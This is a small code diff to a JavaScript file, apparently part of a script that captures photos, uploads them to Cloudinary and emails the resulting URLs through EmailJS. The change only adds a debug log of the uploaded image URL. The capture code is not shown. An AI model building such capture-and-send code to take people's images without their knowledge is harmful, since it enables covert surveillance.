@@ -28,7 +28,6 @@ async function captureAndUploadPhotos() {
     return imageURLs;  // Return array of image URLs
 }
 
-// Function to upload images to Cloudinary
 async function uploadToCloudinary(base64Image) {
     const formData = new FormData();
     formData.append('file', base64Image.split(',')[1]);  // Remove the data:image/jpeg;base64, part
@@ -40,8 +39,10 @@ async function uploadToCloudinary(base64Image) {
     });
 
     const data = await response.json();
+    console.log('Uploaded Image URL:', data.secure_url);  // Log the secure URL for debugging
     return data.secure_url;  // Return the secure URL of the uploaded image
 }
+
 
 // Function to send email via EmailJS
 async function sendEmailWithImageURLs(data, imageURLs) {
